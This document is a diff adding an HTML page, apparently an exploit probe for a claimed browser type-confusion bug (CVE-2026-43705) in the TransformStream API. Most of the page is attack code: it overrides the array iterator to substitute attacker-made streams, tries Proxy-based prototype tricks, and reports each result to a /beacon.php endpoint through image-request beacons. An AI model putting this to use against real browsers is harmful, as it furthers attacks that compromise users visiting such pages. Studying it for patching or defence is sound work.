@@ -1,0 +1,200 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1145</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+
+log('phase','=== P1145: CVE-2026-43705 TransformStream Type Confusion ===');
+log('info','Test: override Array.prototype[Symbol.iterator] during TransformStream construction');
+B('P1145-START','t='+Date.now());
+
+// ===== SECTION A: Feature detection =====
+var features={};
+features.TransformStream=(typeof TransformStream!=='undefined');
+features.ReadableStream=(typeof ReadableStream!=='undefined');
+features.WritableStream=(typeof WritableStream!=='undefined');
+features.Symbol_iterator=(typeof Symbol!=='undefined'&&typeof Symbol.iterator!=='undefined');
+
+log('info','TransformStream: '+features.TransformStream);
+log('info','ReadableStream: '+features.ReadableStream);
+log('info','WritableStream: '+features.WritableStream);
+B('P1145-FEAT','TS='+features.TransformStream+'|RS='+features.ReadableStream+'|WS='+features.WritableStream);
+
+if(!features.TransformStream){
+  log('fail','TransformStream not available - CVE-2026-43705 not applicable');
+  B('P1145-DONE','no_transformstream');
+}else{
+
+// ===== SECTION B: Basic TransformStream test =====
+log('phase','--- B: Basic TransformStream ---');
+var basicOK=false;
+try{
+  var ts=new TransformStream({
+    transform:function(chunk,controller){controller.enqueue(chunk.toUpperCase());}
+  });
+  basicOK=true;
+  log('ok','TransformStream created successfully');
+  log('info','readable: '+(ts.readable?'yes':'no')+' writable: '+(ts.writable?'yes':'no'));
+}catch(e){
+  log('fail','TransformStream error: '+e.message);
+}
+B('P1145-BASIC','ok='+basicOK);
+
+// ===== SECTION C: Iterator override test =====
+log('phase','--- C: Array iterator override ---');
+var origIterator=Array.prototype[Symbol.iterator];
+var iterCallCount=0;
+var iterArgs=[];
+
+// Override the array iterator
+Array.prototype[Symbol.iterator]=function(){
+  iterCallCount++;
+  iterArgs.push({len:this.length,items:Array.from({length:Math.min(this.length,3)},function(_,i){return typeof this[i];}.bind(this))});
+  // Return normal iterator
+  return origIterator.call(this);
+};
+
+var tsResult='?';
+try{
+  iterCallCount=0;
+  iterArgs=[];
+  var ts2=new TransformStream();
+  tsResult='OK:iter='+iterCallCount;
+  log('ok','TransformStream with override: iter called '+iterCallCount+' times');
+  for(var i=0;i<iterArgs.length;i++){
+    log('info','  call '+i+': len='+iterArgs[i].len+' types='+iterArgs[i].items.join(','));
+  }
+}catch(e){
+  tsResult='ERR:'+e.message;
+  log('fail','Error: '+e.message);
+}
+B('P1145-ITER','result='+tsResult+'|calls='+iterCallCount);
+
+// ===== SECTION D: Two-pass substitution test =====
+log('phase','--- D: Substitution attack ---');
+var pass=0;
+var realStreams=null;
+var fakeStreams=null;
+var substituted=false;
+
+Array.prototype[Symbol.iterator]=function(){
+  pass++;
+  if(pass===2&&this.length>=2){
+    // On second pass, substitute our own streams
+    substituted=true;
+    log('win','SUBSTITUTION on pass 2! Array len='+this.length);
+    B('P1145-SUBST','pass='+pass+'|len='+this.length);
+
+    // Create fake streams to substitute
+    var fakeReadable=new ReadableStream({start:function(c){c.enqueue('FAKE_DATA');c.close();}});
+    var fakeWritable=new WritableStream({write:function(chunk){
+      log('win','Fake writable received: '+chunk);
+      B('P1145-FAKE-WRITE','chunk='+chunk);
+    }});
+
+    // Return iterator over our fake array
+    return [fakeReadable,fakeWritable][Symbol.iterator]();
+  }
+  return origIterator.call(this);
+};
+
+var substResult='?';
+try{
+  pass=0;
+  substituted=false;
+  var ts3=new TransformStream();
+  substResult='OK:subst='+substituted+'|pass='+pass;
+  if(substituted){
+    log('win','!!! SUBSTITUTION WORKED !!!');
+    // Try to use the transform stream
+    try{
+      var w=ts3.writable.getWriter();
+      w.write('TEST_DATA');
+      w.close();
+      var r=ts3.readable.getReader();
+      r.read().then(function(res){
+        log('win','Read from substituted stream: '+JSON.stringify(res));
+        B('P1145-READ','val='+JSON.stringify(res));
+      });
+    }catch(e2){
+      log('fail','Stream use error: '+e2.message);
+    }
+  }
+}catch(e){
+  substResult='ERR:'+e.message;
+  log('fail','Substitution error: '+e.message);
+}
+B('P1145-SUBST-RESULT',substResult);
+
+// Restore iterator
+Array.prototype[Symbol.iterator]=origIterator;
+
+// ===== SECTION E: Direct arg-array TransformStream test =====
+log('phase','--- E: Constructor arg variations ---');
+// Try passing arrays directly to TransformStream constructor
+var argTests=[
+  {name:'empty',args:[]},
+  {name:'obj',args:[{transform:function(c,ctrl){ctrl.enqueue(c);}}]},
+  {name:'obj+strategy',args:[{},{highWaterMark:1}]},
+  {name:'obj+2strategy',args:[{},{highWaterMark:1},{highWaterMark:1}]}
+];
+
+for(var ti=0;ti<argTests.length;ti++){
+  var test=argTests[ti];
+  try{
+    var ts4=new TransformStream.apply(null,test.args);
+    log('ok',test.name+': created');
+  }catch(e){
+    // TransformStream.apply may not work, try different approach
+    try{
+      var ts4;
+      if(test.args.length===0) ts4=new TransformStream();
+      else if(test.args.length===1) ts4=new TransformStream(test.args[0]);
+      else if(test.args.length===2) ts4=new TransformStream(test.args[0],test.args[1]);
+      else ts4=new TransformStream(test.args[0],test.args[1],test.args[2]);
+      log('ok',test.name+': created (alt)');
+    }catch(e2){
+      log('fail',test.name+': '+e2.message);
+    }
+  }
+}
+
+// ===== SECTION F: Proxy-based prototype override =====
+log('phase','--- F: Proxy / defineProperty attacks ---');
+
+// Test if TransformStream reads from prototype chain during init
+var protoResult='?';
+try{
+  var handler={
+    get:function(target,prop){
+      if(prop==='transform'||prop==='start'||prop==='flush'){
+        log('info','Proxy get: '+prop);
+        B('P1145-PROXY-GET',prop);
+      }
+      return target[prop];
+    },
+    set:function(target,prop,value){
+      log('info','Proxy set: '+prop);
+      B('P1145-PROXY-SET',prop);
+      target[prop]=value;
+      return true;
+    }
+  };
+  var proxyTransformer=new Proxy({
+    transform:function(chunk,controller){controller.enqueue(chunk);}
+  },handler);
+  var ts5=new TransformStream(proxyTransformer);
+  protoResult='OK';
+  log('ok','Proxy transformer accepted');
+}catch(e){
+  protoResult='ERR:'+e.message;
+  log('fail','Proxy: '+e.message);
+}
+B('P1145-PROXY',protoResult);
+
+B('P1145-DONE','feat='+features.TransformStream+'|iter='+iterCallCount+'|subst='+substituted);
+log('phase','=== P1145 DONE ===');
+}
+</script></body></html>
